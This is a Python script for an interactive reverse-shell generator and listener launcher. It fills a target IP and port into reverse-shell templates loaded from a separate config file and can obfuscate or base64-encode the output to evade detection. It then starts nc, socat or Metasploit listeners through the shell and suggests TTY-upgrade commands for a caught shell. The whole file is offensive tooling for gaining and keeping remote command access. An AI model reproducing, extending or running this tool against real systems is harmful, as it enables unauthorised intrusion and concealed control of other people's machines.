import os
import json
import socket
import base64
import re
import random
import string
import subprocess
import platform
import readline
from datetime import datetime
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

# Load configuration from config.json
def load_config():
    with open('config.json', 'r') as config_file:
        return json.load(config_file)

config = load_config()

reverse_shells = config['reverse_shells']
metasploit_payloads = config['metasploit_payloads']
tty_methods = config['tty_upgrade_methods']
listeners = config['listeners']
history_file = os.path.expanduser(config['history_file'])

# Load history data if available
if os.path.exists(history_file):
    with open(history_file, 'r') as file:
        history_data = json.load(file)
else:
    history_data = {"ips": [], "ports": []}

def print_banner():
    banner = f"""
{Fore.CYAN}
  ██████╗ ███████╗██╗   ██╗███████╗███████╗██╗  ██╗███████╗██╗     ██╗     
 ██╔════╝ ██╔════╝██║   ██║██╔════╝██╔════╝██║  ██║██╔════╝██║     ██║     
 ██║  ███╗█████╗  ██║   ██║███████╗███████╗███████║█████╗  ██║     ██║     
 ██║   ██║██╔══╝  ██║   ██║╚════██║╚════██║██╔══██║██╔══╝  ██║     ██║     
 ╚██████╔╝███████╗╚██████╔╝███████║███████║██║  ██║███████╗███████╗███████╗
  ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
{Style.RESET_ALL}"""
    print(banner)

def validate_ip(ip):
    pattern = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
    return pattern.match(ip) and all(0 <= int(octet) < 256 for octet in ip.split('.'))

def validate_port(port):
    return port.isdigit() and 1 <= int(port) <= 65535

def obfuscate_shell(shell):
    return ''.join([f"\\{x}" if random.random() > 0.4 else x for x in shell])

def generate_reverse_shell(ip, port, shell_type, encode=False, obfuscate=False):
    if shell_type in reverse_shells:
        shell = reverse_shells[shell_type].format(ip, port)
        if obfuscate:
            shell = obfuscate_shell(shell)
        if encode:
            shell = base64.b64encode(shell.encode()).decode()
        print(f"{Fore.GREEN}[+] Generated Reverse Shell:\n{shell}")
    else:
        print(f"{Fore.RED}[-] Invalid shell type.")

def setup_listener(ip, port, listener_type):
    if listener_type == "msfconsole":
        # Display available Metasploit payloads
        print(f"{Fore.CYAN}[*] Available Metasploit Payloads:")
        for idx, payload in enumerate(metasploit_payloads.keys(), start=1):
            print(f"{Fore.YELLOW}[{idx}] {payload}")
        
        payload_choice = input("[*] Choose a Metasploit payload: ").strip()
        selected_payload = list(metasploit_payloads.values())[int(payload_choice) - 1]

        # Construct the listener command for msfconsole
        listener_command = listeners[listener_type].format(selected_payload, ip, port)
        print(f"{Fore.CYAN}[*] Starting Metasploit listener with:\n{listener_command}")
        subprocess.run(listener_command, shell=True)

    elif listener_type in listeners:
        # For nc and socat listeners, only ip and port are needed
        listener_command = listeners[listener_type].format(port)
        print(f"{Fore.CYAN}[*] Starting listener with:\n{listener_command}")
        subprocess.run(listener_command, shell=True)
    else:
        print(f"{Fore.RED}[-] Invalid listener type.")


def upgrade_to_tty():
    for idx, method in enumerate(tty_methods, start=1):
        print(f"{Fore.YELLOW}[{idx}] {method}")
    choice = input("[*] Choose a TTY method: ")
    if choice.isdigit() and 1 <= int(choice) <= len(tty_methods):
        print(f"{Fore.GREEN}\n[+] Run this TTY upgrade:\n{tty_methods[int(choice) - 1]}")

def main():
    print_banner()
    ip = input("[*] Enter target IP: ").strip()
    while not validate_ip(ip):
        print(f"{Fore.RED}[!] Invalid IP")
        ip = input("[*] Enter target IP: ").strip()

    port = input("[*] Enter target port: ").strip()
    while not validate_port(port):
        print(f"{Fore.RED}[!] Invalid port")
        port = input("[*] Enter target port: ").strip()

    print(f"{Fore.CYAN}[*] Available Shells:")
    for idx, shell in enumerate(reverse_shells.keys(), start=1):
        print(f"{Fore.YELLOW}[{idx}] {shell}")
    
    shell_choice = input("[*] Choose a reverse shell: ").strip()
    shell_type = list(reverse_shells.keys())[int(shell_choice) - 1]

    generate_reverse_shell(ip, port, shell_type)
    
    if input("[*] Upgrade to TTY? (y/n): ").lower() == 'y':
        upgrade_to_tty()

    listener_type = input("[*] Choose listener (nc/socat/msfconsole): ").strip()
    setup_listener(ip, port, listener_type)

if __name__ == "__main__":
    main()
